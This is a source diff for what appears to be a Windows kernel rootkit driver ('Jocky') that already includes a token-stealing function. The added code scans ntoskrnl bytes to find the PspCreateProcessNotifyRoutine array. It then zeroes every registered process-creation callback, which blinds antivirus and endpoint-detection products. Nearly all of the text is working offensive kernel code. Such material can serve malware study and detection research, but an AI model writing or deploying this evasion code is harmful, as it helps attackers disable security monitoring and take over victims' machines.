@@ -218,3 +218,91 @@ NTSTATUS JockyStealToken(ULONG targetPid) {
     return STATUS_SUCCESS;
 }
 
+// Pattern to find PspCreateProcessNotifyRoutine in ntoskrnl
+// This works on Win10 21H2 — pattern may differ on other builds
+// Found by scanning bytes around PsSetCreateProcessNotifyRoutine
+
+ULONG_PTR FindPspCreateProcessNotifyRoutine() {
+    // Get base of ntoskrnl
+    ULONG_PTR ntBase = 0;
+
+    // Walk loaded module list to find ntoskrnl base
+    PLIST_ENTRY moduleList = (PLIST_ENTRY)PsLoadedModuleList;
+    PLIST_ENTRY entry = moduleList->Flink;
+
+    while (entry != moduleList) {
+        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(
+            entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
+        );
+
+        // ntoskrnl is the first entry in the list
+        ntBase = (ULONG_PTR)mod->DllBase;
+        break;
+    }
+
+    if (!ntBase) return 0;
+
+    // Scan for the byte pattern that precedes the array
+    // Pattern: 4C 8D 2D ?? ?? ?? ?? — lea r13, [PspCreateProcessNotifyRoutine]
+    // This is inside PsSetCreateProcessNotifyRoutine
+    UCHAR pattern[] = { 0x4C, 0x8D, 0x2D };
+    ULONG_PTR scanStart = ntBase;
+    ULONG_PTR scanEnd   = ntBase + 0x1000000; // scan 16MB
+
+    for (ULONG_PTR addr = scanStart; addr < scanEnd - 7; addr++) {
+        UCHAR* bytes = (UCHAR*)addr;
+
+        if (bytes[0] == pattern[0] &&
+            bytes[1] == pattern[1] &&
+            bytes[2] == pattern[2]) {
+
+            // Extract RIP-relative offset (bytes 3-6)
+            LONG offset = *(LONG*)(addr + 3);
+
+            // RIP at next instruction = addr + 7
+            ULONG_PTR target = addr + 7 + offset;
+
+            // Sanity check — must be in ntoskrnl range
+            if (target > ntBase && target < scanEnd) {
+                DbgPrint("[JOCKY] Found PspCreateProcessNotifyRoutine"
+                         " at 0x%llX\n", target);
+                return target;
+            }
+        }
+    }
+
+    return 0;
+}
+
+NTSTATUS JockyRemoveCallbacks() {
+    ULONG_PTR arrayBase = FindPspCreateProcessNotifyRoutine();
+    if (!arrayBase) {
+        DbgPrint("[JOCKY] Failed to find callback array\n");
+        return STATUS_NOT_FOUND;
+    }
+
+    // Array has 64 EX_CALLBACK_ROUTINE_BLOCK* entries
+    // Each is a pointer — if non-null, a callback is registered
+    // Low bits are used as flags — mask them off to get real pointer
+    ULONG removed = 0;
+
+    for (int i = 0; i < 64; i++) {
+        ULONG_PTR* slot = (ULONG_PTR*)(arrayBase + i * sizeof(ULONG_PTR));
+        ULONG_PTR entry = *slot;
+
+        if (entry != 0) {
+            // Get actual pointer (mask off low 4 bits)
+            ULONG_PTR cleanPtr = entry & ~0xFULL;
+
+            if (cleanPtr) {
+                // Zero out the slot — callback is removed
+                *slot = 0;
+                removed++;
+                DbgPrint("[JOCKY] Removed callback at slot %d\n", i);
+            }
+        }
+    }
+
+    DbgPrint("[JOCKY] Removed %lu process notify callbacks\n", removed);
+    return STATUS_SUCCESS;
+}
